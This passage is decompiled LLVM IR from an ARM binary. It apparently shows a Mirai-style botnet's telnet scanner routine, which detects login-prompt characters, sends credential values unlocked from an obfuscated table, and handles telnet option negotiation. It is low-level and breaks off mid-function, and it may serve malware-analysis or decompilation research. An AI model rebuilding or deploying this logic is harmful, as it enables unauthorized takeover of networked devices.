dec_label_pc_f8e4:                                ; preds = %.thread86, %dec_label_pc_f8bc, %bb427
  %v0_f8e4 = load i32, i32* @r6, align 4
  %v1_f8e4 = add i32 %v0_f8e4, 4
  %v2_f8e4 = inttoptr i32 %v1_f8e4 to i32*
  %v3_f8e4 = load i32, i32* %v2_f8e4, align 4
  %v1_f8e8 = call i32 @__GI___libc_close(i32 %v3_f8e4)
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f8f4 = load i32, i32* @r6, align 4
  %v2_f8f4 = add i32 %v1_f8f4, 4
  %v3_f8f4 = inttoptr i32 %v2_f8f4 to i32*
  store i32 -1, i32* %v3_f8f4, align 4
  %v0_f8f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_f8f8 = load i32, i32* @r6, align 4
  %v2_f8f8 = add i32 %v1_f8f8, 12
  %v3_f8f8 = inttoptr i32 %v2_f8f8 to i32*
  store i32 %v0_f8f8, i32* %v3_f8f8, align 4
  br label %dec_label_pc_f8fc

dec_label_pc_f8fc:                                ; preds = %dec_label_pc_fac0, %bb436, %dec_label_pc_10080, %dec_label_pc_f85c, %dec_label_pc_10124, %dec_label_pc_fe70, %dec_label_pc_f8e4
  %v0_f8fc = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8fc = icmp eq i32 %v0_f8fc, 0
  store i1 %v2_f8fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8fc, label %dec_label_pc_f6b0.loopexit, label %dec_label_pc_f904

dec_label_pc_f904:                                ; preds = %dec_label_pc_f8fc, %dec_label_pc_ff24, %dec_label_pc_fd64, %dec_label_pc_fc20, %dec_label_pc_fb4c, %dec_label_pc_f9a8, %dec_label_pc_101f8, %dec_label_pc_1019c
  %v0_f904 = load i32, i32* @r6, align 4
  %v1_f904 = add i32 %v0_f904, 24
  %v2_f904 = inttoptr i32 %v1_f904 to i32*
  %v3_f904 = load i32, i32* %v2_f904, align 4
  %v0_f908 = load i32, i32* @r7, align 4
  %v2_f908 = sub i32 %v0_f908, %v3_f904
  %v3_f908 = icmp uge i32 %v0_f908, %v3_f904
  store i1 %v3_f908, i1* %cpsr_c.global-to-local, align 1
  %v4_f908 = xor i32 %v0_f908, %v3_f904
  %v5_f908 = xor i32 %v2_f908, %v0_f908
  %v6_f908 = and i32 %v5_f908, %v4_f908
  %v7_f908 = icmp slt i32 %v6_f908, 0
  %v8_f908 = icmp slt i32 %v2_f908, 0
  %v9_f908 = icmp eq i32 %v0_f908, %v3_f904
  store i1 %v9_f908, i1* %cpsr_z.global-to-local, align 1
  %v2_f90c = xor i1 %v8_f908, %v7_f908
  %v0_f908.v3_f904 = select i1 %v2_f90c, i32 %v0_f908, i32 %v3_f904
  store i32 %v0_f908.v3_f904, i32* %r1.global-to-local, align 4
  %v2_f914 = sub i32 %v3_f904, %v0_f908.v3_f904
  store i32 %v2_f914, i32* @r2, align 4
  store i32 %v2_f914, i32* %v2_f904, align 4
  %v0_f91c = load i32, i32* @fp, align 4
  %v1_f91c = load i32, i32* %r1.global-to-local, align 4
  %v2_f91c = add i32 %v1_f91c, %v0_f91c
  store i32 %v2_f91c, i32* @r1, align 4
  store i32 %v0_f91c, i32* @r0, align 4
  %v3_f924 = call i32 @memmove(i32 %v0_f91c, i32 %v2_f91c, i32 %v2_f914)
  br label %dec_label_pc_f734

dec_label_pc_f92c:                                ; preds = %dec_label_pc_f734
  %v1_f92c = add i32 %v0_f734, 24
  %v2_f92c = inttoptr i32 %v1_f92c to i32*
  %v3_f92c = load i32, i32* %v2_f92c, align 4
  store i32 %v3_f92c, i32* %r2.global-to-local, align 4
  %v1_f930 = add i32 %v3_f92c, -1
  store i32 %v1_f930, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f934 = icmp eq i32 %v1_f930, 0
  store i1 %v2_f934, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp slt i32 %v1_f930, 1
  br i1 %tmp430, label %dec_label_pc_f6b4.backedge.thread, label %dec_label_pc_f93c

dec_label_pc_f93c:                                ; preds = %dec_label_pc_f92c
  %v2_f93c = add i32 %v1_f930, %v0_f734
  store i32 %v2_f93c, i32* %r3.global-to-local, align 4
  %v1_f940 = add i32 %v2_f93c, 28
  %v2_f940 = inttoptr i32 %v1_f940 to i8*
  %v3_f940 = load i8, i8* %v2_f940, align 1
  %v4_f940 = zext i8 %v3_f940 to i32
  store i32 %v4_f940, i32* %r3.global-to-local, align 4
  %v2_f944 = icmp ugt i8 %v3_f940, 61
  store i1 %v2_f944, i1* %cpsr_c.global-to-local, align 1
  %v7_f944 = icmp eq i8 %v3_f940, 62
  store i1 %v7_f944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f944, label %dec_label_pc_f9a8, label %bb431

bb431:                                            ; preds = %dec_label_pc_f93c
  %v3_f948 = icmp ugt i8 %v3_f940, 57
  store i1 %v3_f948, i1* %cpsr_c.global-to-local, align 1
  %v8_f948 = icmp eq i8 %v3_f940, 58
  store i1 %v8_f948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f948, label %dec_label_pc_f9a8, label %dec_label_pc_f950

dec_label_pc_f950:                                ; preds = %bb431
  %v2_f950 = icmp ugt i8 %v3_f940, 35
  store i1 %v2_f950, i1* %cpsr_c.global-to-local, align 1
  %v7_f950 = icmp eq i8 %v3_f940, 36
  store i1 %v7_f950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f950, label %dec_label_pc_f9a8, label %dec_label_pc_f958

dec_label_pc_f958:                                ; preds = %dec_label_pc_f950
  %v2_f958 = icmp ugt i8 %v3_f940, 34
  store i1 %v2_f958, i1* %cpsr_c.global-to-local, align 1
  %v7_f958 = icmp eq i8 %v3_f940, 35
  store i1 %v7_f958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f958, label %dec_label_pc_f9a8, label %dec_label_pc_f960

dec_label_pc_f960:                                ; preds = %dec_label_pc_f958
  %v2_f960 = icmp ugt i8 %v3_f940, 36
  store i1 %v2_f960, i1* %cpsr_c.global-to-local, align 1
  %v7_f960 = icmp eq i8 %v3_f940, 37
  store i1 %v7_f960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f960, label %dec_label_pc_f9a8, label %dec_label_pc_f990.preheader

dec_label_pc_f990.preheader:                      ; preds = %dec_label_pc_f960
  %v3_f964 = add i32 %v0_f734, 28
  %v2_f968 = add i32 %v3_f964, %v3_f92c
  store i32 %v2_f968, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f990

dec_label_pc_f974:                                ; preds = %bb432
  %v2_f974 = icmp ugt i8 %v3_f998, 35
  store i1 %v2_f974, i1* %cpsr_c.global-to-local, align 1
  %v7_f974 = icmp eq i8 %v3_f998, 36
  store i1 %v7_f974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f974, label %dec_label_pc_f9a8, label %dec_label_pc_f97c

dec_label_pc_f97c:                                ; preds = %dec_label_pc_f974
  %v2_f97c = icmp ugt i8 %v3_f998, 34
  store i1 %v2_f97c, i1* %cpsr_c.global-to-local, align 1
  %v7_f97c = icmp eq i8 %v3_f998, 35
  store i1 %v7_f97c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f97c, label %dec_label_pc_f9a8, label %dec_label_pc_f984

dec_label_pc_f984:                                ; preds = %dec_label_pc_f97c
  %v2_f984 = icmp ugt i8 %v3_f998, 36
  store i1 %v2_f984, i1* %cpsr_c.global-to-local, align 1
  %v7_f984 = icmp eq i8 %v3_f998, 37
  store i1 %v7_f984, i1* %cpsr_z.global-to-local, align 1
  %v1_f988 = add i32 %v0_f988, -1
  store i32 %v1_f988, i32* %r3.global-to-local, align 4
  br i1 %v7_f984, label %dec_label_pc_f9a8, label %dec_label_pc_f990

dec_label_pc_f990:                                ; preds = %dec_label_pc_f990.preheader, %dec_label_pc_f984
  %v0_f988 = phi i32 [ %v2_f968, %dec_label_pc_f990.preheader ], [ %v1_f988, %dec_label_pc_f984 ]
  %v0_f990 = phi i32 [ %v1_f930, %dec_label_pc_f990.preheader ], [ %v1_f990, %dec_label_pc_f984 ]
  %v1_f990 = add i32 %v0_f990, -1
  store i32 %v1_f990, i32* %r1.global-to-local, align 4
  %v2_f990 = icmp ne i32 %v0_f990, 0
  store i1 %v2_f990, i1* %cpsr_c.global-to-local, align 1
  %v7_f990 = icmp eq i32 %v0_f990, 1
  store i1 %v7_f990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f990, label %dec_label_pc_f6b4.backedge.thread562, label %dec_label_pc_f998

dec_label_pc_f998:                                ; preds = %dec_label_pc_f990
  %v1_f998 = add i32 %v0_f988, -2
  %v2_f998 = inttoptr i32 %v1_f998 to i8*
  %v3_f998 = load i8, i8* %v2_f998, align 1
  %v4_f998 = zext i8 %v3_f998 to i32
  store i32 %v4_f998, i32* %r2.global-to-local, align 4
  %v2_f99c = icmp ugt i8 %v3_f998, 61
  store i1 %v2_f99c, i1* %cpsr_c.global-to-local, align 1
  %v7_f99c = icmp eq i8 %v3_f998, 62
  store i1 %v7_f99c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f99c, label %dec_label_pc_f9a8, label %bb432

bb432:                                            ; preds = %dec_label_pc_f998
  %v3_f9a0 = icmp ugt i8 %v3_f998, 57
  store i1 %v3_f9a0, i1* %cpsr_c.global-to-local, align 1
  %v8_f9a0 = icmp eq i8 %v3_f998, 58
  store i1 %v8_f9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f9a0, label %dec_label_pc_f9a8, label %dec_label_pc_f974

dec_label_pc_f9a8:                                ; preds = %dec_label_pc_f998, %bb432, %dec_label_pc_f984, %dec_label_pc_f97c, %dec_label_pc_f974, %dec_label_pc_f960, %dec_label_pc_f93c, %dec_label_pc_f958, %dec_label_pc_f950, %bb431
  %v0_f9ac = phi i32 [ %v1_f930, %dec_label_pc_f960 ], [ %v1_f930, %dec_label_pc_f93c ], [ %v1_f930, %dec_label_pc_f958 ], [ %v1_f930, %dec_label_pc_f950 ], [ %v1_f930, %bb431 ], [ %v1_f990, %dec_label_pc_f974 ], [ %v1_f990, %dec_label_pc_f97c ], [ %v1_f990, %dec_label_pc_f984 ], [ %v1_f990, %bb432 ], [ %v1_f990, %dec_label_pc_f998 ]
  %v1_f9ac = add i32 %v0_f9ac, 1
  store i32 %v1_f9ac, i32* @r7, align 4
  %v1_f9b0 = call i32 @table_unlock_val(i32 10)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  %v3_f9c0 = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  %v3_f9c4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f9c4, i32* %r2.global-to-local, align 4
  store i32 %v3_f9c0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f9d0 = load i32, i32* @r6, align 4
  %v1_f9d0 = add i32 %v0_f9d0, 4
  %v2_f9d0 = inttoptr i32 %v1_f9d0 to i32*
  %v3_f9d0 = load i32, i32* %v2_f9d0, align 4
  %v4_f9d4 = call i32 @__libc_send(i32 %v3_f9d0, i32 %v3_f9c0, i32 %v3_f9c4, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f9e4 = load i32, i32* @r6, align 4
  %v1_f9e4 = add i32 %v0_f9e4, 4
  %v2_f9e4 = inttoptr i32 %v1_f9e4 to i32*
  %v3_f9e4 = load i32, i32* %v2_f9e4, align 4
  %v4_f9e8 = call i32 @__libc_send(i32 %v3_f9e4, i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32 2, i32 16384)
  %v1_f9f0 = call i32 @table_lock_val(i32 10)
  store i32 10, i32* @r3, align 4
  %v1_f9f8 = load i32, i32* @r6, align 4
  %v2_f9f8 = add i32 %v1_f9f8, 12
  %v3_f9f8 = inttoptr i32 %v2_f9f8 to i32*
  store i32 10, i32* %v3_f9f8, align 4
  br label %dec_label_pc_f904

dec_label_pc_fa00:                                ; preds = %dec_label_pc_f734
  %v1_fa00 = add i32 %v0_f734, 24
  %v2_fa00 = inttoptr i32 %v1_fa00 to i32*
  %v3_fa00 = load i32, i32* %v2_fa00, align 4
  store i32 %v3_fa00, i32* %r1.global-to-local, align 4
  %v0_fa04 = load i32, i32* @fp, align 4
  store i32 %v0_fa04, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_fa0c172 = icmp eq i32 %v3_fa00, 0
  store i1 %v3_fa0c172, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_fa0c172, i1* %cpsr_z.global-to-local, align 1
  %v6_fa10179 = icmp sgt i32 %v3_fa00, 0
  br i1 %v6_fa10179, label %dec_label_pc_fa14.preheader, label %dec_label_pc_fac0

dec_label_pc_fa0c.loopexit:                       ; preds = %dec_label_pc_fa30
  %v2_fa38 = add i32 %v1_fa38, 2
  store i32 %v2_fa38, i32* @r4, align 4
  %v2_fa3c = add i32 %v1_fa3c, 2
  store i32 %v2_fa3c, i32* @r7, align 4
  %v3_fa0c = icmp uge i32 %v2_fa3c, %v1_fa0c
  store i1 %v3_fa0c, i1* %cpsr_c.global-to-local, align 1
  %v9_fa0c = icmp eq i32 %v2_fa3c, %v1_fa0c
  store i1 %v9_fa0c, i1* %cpsr_z.global-to-local, align 1
  %v6_fa10 = icmp slt i32 %v2_fa3c, %v1_fa0c
  br i1 %v6_fa10, label %dec_label_pc_fa14.preheader, label %dec_label_pc_fac0

dec_label_pc_fa14.preheader:                      ; preds = %dec_label_pc_fa00, %dec_label_pc_fa0c.loopexit
  %v6_fac8273 = phi i32 [ %v6_fac8274, %dec_label_pc_fa0c.loopexit ], [ %v0_f734, %dec_label_pc_fa00 ]
  %v1_fa3c262 = phi i32 [ %v2_fa3c, %dec_label_pc_fa0c.loopexit ], [ 0, %dec_label_pc_fa00 ]
  %v1_fa20260 = phi i32 [ %v1_fa0c, %dec_label_pc_fa0c.loopexit ], [ %v3_fa00, %dec_label_pc_fa00 ]
  %v0_fa14258 = phi i32 [ %v2_fa38, %dec_label_pc_fa0c.loopexit ], [ %v0_fa04, %dec_label_pc_fa00 ]
  br label %dec_label_pc_fa14

dec_label_pc_fa14:                                ; preds = %dec_label_pc_fa14.preheader, %dec_label_pc_faa4
  %v6_fac8274 = phi i32 [ %v6_fac8273, %dec_label_pc_fa14.preheader ], [ %v0_faac, %dec_label_pc_faa4 ]
  %v1_fa3c = phi i32 [ %v1_fa3c262, %dec_label_pc_fa14.preheader ], [ %v1_fab0, %dec_label_pc_faa4 ]
  %v1_fa0c = phi i32 [ %v1_fa20260, %dec_label_pc_fa14.preheader ], [ %v3_faac, %dec_label_pc_faa4 ]
  %v1_fa38 = phi i32 [ %v0_fa14258, %dec_label_pc_fa14.preheader ], [ %v1_fab8, %dec_label_pc_faa4 ]
  %v1_fa14 = inttoptr i32 %v1_fa38 to i8*
  %v2_fa14 = load i8, i8* %v1_fa14, align 1
  %v3_fa14 = zext i8 %v2_fa14 to i32
  store i32 %v3_fa14, i32* @r3, align 4
  %v2_fa18 = icmp eq i8 %v2_fa14, -1
  store i1 %v2_fa18, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fa18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa18, label %dec_label_pc_fa20, label %dec_label_pc_fac0

dec_label_pc_fa20:                                ; preds = %dec_label_pc_fa14
  %v0_fa20 = load i32, i32* @fp, align 4
  %v2_fa20 = add i32 %v0_fa20, %v1_fa0c
  store i32 %v2_fa20, i32* %r2.global-to-local, align 4
  %v1_fa24 = add i32 %v1_fa38, 1
  store i32 %v1_fa24, i32* @r5, align 4
  %v3_fa28 = icmp uge i32 %v2_fa20, %v1_fa24
  store i1 %v3_fa28, i1* %cpsr_c.global-to-local, align 1
  %v9_fa28 = icmp eq i32 %v2_fa20, %v1_fa24
  store i1 %v9_fa28, i1* %cpsr_z.global-to-local, align 1
  %v2_fa2c = xor i1 %v3_fa28, true
  %v3_fa2c = or i1 %v9_fa28, %v2_fa2c
  br i1 %v3_fa2c, label %dec_label_pc_fac0, label %dec_label_pc_fa30

dec_label_pc_fa30:                                ; preds = %dec_label_pc_fa20
  %v2_fa30 = inttoptr i32 %v1_fa24 to i8*
  %v3_fa30 = load i8, i8* %v2_fa30, align 1
  %v4_fa30 = zext i8 %v3_fa30 to i32
  store i32 %v4_fa30, i32* @r3, align 4
  %v2_fa34 = icmp eq i8 %v3_fa30, -1
  store i1 %v2_fa34, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fa34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa34, label %dec_label_pc_fa0c.loopexit, label %dec_label_pc_fa44

dec_label_pc_fa44:                                ; preds = %dec_label_pc_fa30
  %v2_fa44 = icmp ugt i8 %v3_fa30, -4
  store i1 %v2_fa44, i1* %cpsr_c.global-to-local, align 1
  %v7_fa44 = icmp eq i8 %v3_fa30, -3
  store i1 %v7_fa44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa44, label %dec_label_pc_1009c, label %dec_label_pc_fa4c

dec_label_pc_fa4c:                                ; preds = %dec_label_pc_fa44
  %v1_fa4c = add i32 %v1_fa38, 2
  store i32 %v1_fa4c, i32* @r3, align 4
  %v3_fa50 = icmp uge i32 %v2_fa20, %v1_fa4c
  store i1 %v3_fa50, i1* %cpsr_c.global-to-local, align 1
  %v9_fa50 = icmp eq i32 %v2_fa20, %v1_fa4c
  store i1 %v9_fa50, i1* %cpsr_z.global-to-local, align 1
  %v2_fa54 = xor i1 %v3_fa50, true
  %v3_fa54 = or i1 %v9_fa50, %v2_fa54
  br i1 %v3_fa54, label %dec_label_pc_fac0, label %dec_label_pc_fa58

dec_label_pc_fa58:                                ; preds = %dec_label_pc_10100, %bb456, %.thread147, %dec_label_pc_fa4c
  %v0_fa58 = load i32, i32* @r5, align 4
  %v1_fa58 = inttoptr i32 %v0_fa58 to i8*
  %v2_fa58 = load i8, i8* %v1_fa58, align 1
  %v3_fa58 = zext i8 %v2_fa58 to i32
  store i32 %v3_fa58, i32* %r3.global-to-local, align 4
  %v2_fa5c = icmp ugt i8 %v2_fa58, -4
  store i1 %v2_fa5c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa5c = icmp eq i8 %v2_fa58, -3
  store i1 %v7_fa5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa5c, label %.thread97, label %dec_label_pc_fa6c

.thread97:                                        ; preds = %dec_label_pc_fa58
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_fa58, align 1
  %v0_fa68.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fa68.pr.pr, label %.thread100, label %.thread97.dec_label_pc_fa6cthread-pre-split_crit_edge

.thread97.dec_label_pc_fa6cthread-pre-split_crit_edge: ; preds = %.thread97
  %v0_fa6c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fa6c

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_fa58, %.thread97.dec_label_pc_fa6cthread-pre-split_crit_edge
  %v0_fa6c.pr = phi i32 [ %v0_fa6c.pr.pre, %.thread97.dec_label_pc_fa6cthread-pre-split_crit_edge ], [ %v3_fa58, %dec_label_pc_fa58 ]
  %v2_fa6c = icmp ugt i32 %v0_fa6c.pr, 250
  store i1 %v2_fa6c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa6c = icmp eq i32 %v0_fa6c.pr, 251
  store i1 %v7_fa6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa6c, label %bb433, label %.thread100

bb433:                                            ; preds = %dec_label_pc_fa6c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_fa74 = load i32, i32* @r5, align 4
  %v4_fa74 = inttoptr i32 %v3_fa74 to i8*
  store i8 -3, i8* %v4_fa74, align 1
  br label %.thread100

.thread100:                                       ; preds = %dec_label_pc_fa6c, %.thread97, %bb433
  %v0_fa78 = load i32, i32* @r4, align 4
  %v1_fa78 = add i32 %v0_fa78, 2
  %v2_fa78 = inttoptr i32 %v1_fa78 to i8*
  %v3_fa78 = load i8, i8* %v2_fa78, align 1
  %v4_fa78 = zext i8 %v3_fa78 to i32
  store i32 %v4_fa78, i32* %r3.global-to-local, align 4
  %v2_fa7c = icmp ugt i8 %v3_fa78, -4
  store i1 %v2_fa7c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa7c = icmp eq i8 %v3_fa78, -3
  store i1 %v7_fa7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa7c, label %.thread101, label %dec_label_pc_fa8c

.thread101:                                       ; preds = %.thread100
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_fa78, align 1
  %v0_fa88.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fa88.pr.pr, label %.thread104, label %.thread101.dec_label_pc_fa8cthread-pre-split_crit_edge

.thread101.dec_label_pc_fa8cthread-pre-split_crit_edge: ; preds = %.thread101
  %v0_fa8c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fa8c

dec_label_pc_fa8c:                                ; preds = %.thread100, %.thread101.dec_label_pc_fa8cthread-pre-split_crit_edge
  %v0_fa8c.pr = phi i32 [ %v0_fa8c.pr.pre, %.thread101.dec_label_pc_fa8cthread-pre-split_crit_edge ], [ %v4_fa78, %.thread100 ]
  %v2_fa8c = icmp ugt i32 %v0_fa8c.pr, 250
  store i1 %v2_fa8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa8c = icmp eq i32 %v0_fa8c.pr, 251
  store i1 %v7_fa8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa8c, label %bb434, label %.thread104

bb434:                                            ; preds = %dec_label_pc_fa8c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_fa94 = load i32, i32* @r4, align 4
  %v4_fa94 = add i32 %v3_fa94, 2
  %v5_fa94 = inttoptr i32 %v4_fa94 to i8*
  store i8 -3, i8* %v5_fa94, align 1
  br label %.thread104

.thread104:                                       ; preds = %dec_label_pc_fa8c, %.thread101, %bb434
  %v0_fa9c = load i32, i32* @r4, align 4
  br label %dec_label_pc_faa4

dec_label_pc_faa4:                                ; preds = %dec_label_pc_101b0, %.thread104
  %storemerge3 = phi i32 [ %v2_100b4, %dec_label_pc_101b0 ], [ %v0_fa9c, %.thread104 ]
  %storemerge2 = phi i32 [ 9, %dec_label_pc_101b0 ], [ 3, %.thread104 ]
  %v0_faa8.in.in.in = load i32, i32* @r6, align 4
  %v0_faa8.in.in = add i32 %v0_faa8.in.in.in, 4
  %v0_faa8.in = inttoptr i32 %v0_faa8.in.in to i32*
  %v0_faa8 = load i32, i32* %v0_faa8.in, align 4
  store i32 %storemerge3, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_faa8 = call i32 @__libc_send(i32 %v0_faa8, i32 %storemerge3, i32 %storemerge2, i32 16384)
  %v0_faac = load i32, i32* @r6, align 4
  %v1_faac = add i32 %v0_faac, 24
  %v2_faac = inttoptr i32 %v1_faac to i32*
  %v3_faac = load i32, i32* %v2_faac, align 4
  store i32 %v3_faac, i32* %r1.global-to-local, align 4
  %v0_fab0 = load i32, i32* @r7, align 4
  %v1_fab0 = add i32 %v0_fab0, 3
  store i32 %v1_fab0, i32* @r7, align 4
  %v3_fab4 = icmp uge i32 %v1_fab0, %v3_faac
  store i1 %v3_fab4, i1* %cpsr_c.global-to-local, align 1
  %v9_fab4 = icmp eq i32 %v1_fab0, %v3_faac
  store i1 %v9_fab4, i1* %cpsr_z.global-to-local, align 1
  %v0_fab8 = load i32, i32* @r4, align 4
  %v1_fab8 = add i32 %v0_fab8, 3
  store i32 %v1_fab8, i32* @r4, align 4
  %v5_fabc = icmp slt i32 %v1_fab0, %v3_faac
  br i1 %v5_fabc, label %dec_label_pc_fa14, label %dec_label_pc_fac0

dec_label_pc_fac0:                                ; preds = %dec_label_pc_fa0c.loopexit, %dec_label_pc_fa14, %dec_label_pc_faa4, %dec_label_pc_fa4c, %dec_label_pc_fa20, %dec_label_pc_fa00, %dec_label_pc_1009c.dec_label_pc_fac0.loopexit_crit_edge
  %v6_fac8 = phi i32 [ %v0_100cc, %dec_label_pc_1009c.dec_label_pc_fac0.loopexit_crit_edge ], [ %v0_f734, %dec_label_pc_fa00 ], [ %v6_fac8274, %dec_label_pc_fa14 ], [ %v0_faac, %dec_label_pc_faa4 ], [ %v6_fac8274, %dec_label_pc_fa4c ], [ %v6_fac8274, %dec_label_pc_fa20 ], [ %v6_fac8274, %dec_label_pc_fa0c.loopexit ]
  %v0_fac0 = phi i32 [ %v0_fac0.pre.pre, %dec_label_pc_1009c.dec_label_pc_fac0.loopexit_crit_edge ], [ 0, %dec_label_pc_fa00 ], [ %v1_fa3c, %dec_label_pc_fa14 ], [ %v1_fab0, %dec_label_pc_faa4 ], [ %v1_fa3c, %dec_label_pc_fa4c ], [ %v1_fa3c, %dec_label_pc_fa20 ], [ %v2_fa3c, %dec_label_pc_fa0c.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fac0 = icmp eq i32 %v0_fac0, 0
  store i1 %v2_fac0, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v0_fac0, 1
  br i1 %tmp435, label %dec_label_pc_f8fc, label %bb436

bb436:                                            ; preds = %dec_label_pc_fac0
  store i32 3, i32* @r3, align 4
  %v7_fac8 = add i32 %v6_fac8, 12
  %v8_fac8 = inttoptr i32 %v7_fac8 to i32*
  store i32 3, i32* %v8_fac8, align 4
  br label %dec_label_pc_f8fc

dec_label_pc_fad0:                                ; preds = %dec_label_pc_f734
  %v1_fad0 = add i32 %v0_f734, 24
  %v2_fad0 = inttoptr i32 %v1_fad0 to i32*
  %v3_fad0 = load i32, i32* %v2_fad0, align 4
  store i32 %v3_fad0, i32* %r2.global-to-local, align 4
  %v1_fad4 = add i32 %v3_fad0, -1
  store i32 %v1_fad4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fad8 = icmp eq i32 %v1_fad4, 0
  store i1 %v2_fad8, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v1_fad4, 1
  br i1 %tmp437, label %dec_label_pc_f6b4.backedge.thread, label %dec_label_pc_fae0

dec_label_pc_fae0:                                ; preds = %dec_label_pc_fad0
  %v2_fae0 = add i32 %v1_fad4, %v0_f734
  store i32 %v2_fae0, i32* %r3.global-to-local, align 4
  %v1_fae4 = add i32 %v2_fae0, 28
  %v2_fae4 = inttoptr i32 %v1_fae4 to i8*
  %v3_fae4 = load i8, i8* %v2_fae4, align 1
  %v4_fae4 = zext i8 %v3_fae4 to i32
  store i32 %v4_fae4, i32* %r3.global-to-local, align 4
  %v2_fae8 = icmp ugt i8 %v3_fae4, 61
  store i1 %v2_fae8, i1* %cpsr_c.global-to-local, align 1
  %v7_fae8 = icmp eq i8 %v3_fae4, 62
  store i1 %v7_fae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fae8, label %dec_label_pc_fb4c, label %bb438

bb438:                                            ; preds = %dec_label_pc_fae0
  %v3_faec = icmp ugt i8 %v3_fae4, 57
  store i1 %v3_faec, i1* %cpsr_c.global-to-local, align 1
  %v8_faec = icmp eq i8 %v3_fae4, 58
  store i1 %v8_faec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_faec, label %dec_label_pc_fb4c, label %dec_label_pc_faf4

dec_label_pc_faf4:                                ; preds = %bb438
  %v2_faf4 = icmp ugt i8 %v3_fae4, 35
  store i1 %v2_faf4, i1* %cpsr_c.global-to-local, align 1
  %v7_faf4 = icmp eq i8 %v3_fae4, 36
  store i1 %v7_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faf4, label %dec_label_pc_fb4c, label %dec_label_pc_fafc

dec_label_pc_fafc:                                ; preds = %dec_label_pc_faf4
  %v2_fafc = icmp ugt i8 %v3_fae4, 34
  store i1 %v2_fafc, i1* %cpsr_c.global-to-local, align 1
  %v7_fafc = icmp eq i8 %v3_fae4, 35
  store i1 %v7_fafc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fafc, label %dec_label_pc_fb4c, label %dec_label_pc_fb04

dec_label_pc_fb04:                                ; preds = %dec_label_pc_fafc
  %v2_fb04 = icmp ugt i8 %v3_fae4, 36
  store i1 %v2_fb04, i1* %cpsr_c.global-to-local, align 1
  %v7_fb04 = icmp eq i8 %v3_fae4, 37
  store i1 %v7_fb04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb04, label %dec_label_pc_fb4c, label %dec_label_pc_fb34.preheader

dec_label_pc_fb34.preheader:                      ; preds = %dec_label_pc_fb04
  %v3_fb08 = add i32 %v0_f734, 28
  %v2_fb0c = add i32 %v3_fb08, %v3_fad0
  store i32 %v2_fb0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fb34

dec_label_pc_fb18:                                ; preds = %bb439
  %v2_fb18 = icmp ugt i8 %v3_fb3c, 35
  store i1 %v2_fb18, i1* %cpsr_c.global-to-local, align 1
  %v7_fb18 = icmp eq i8 %v3_fb3c, 36
  store i1 %v7_fb18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb18, label %dec_label_pc_fb4c, label %dec_label_pc_fb20

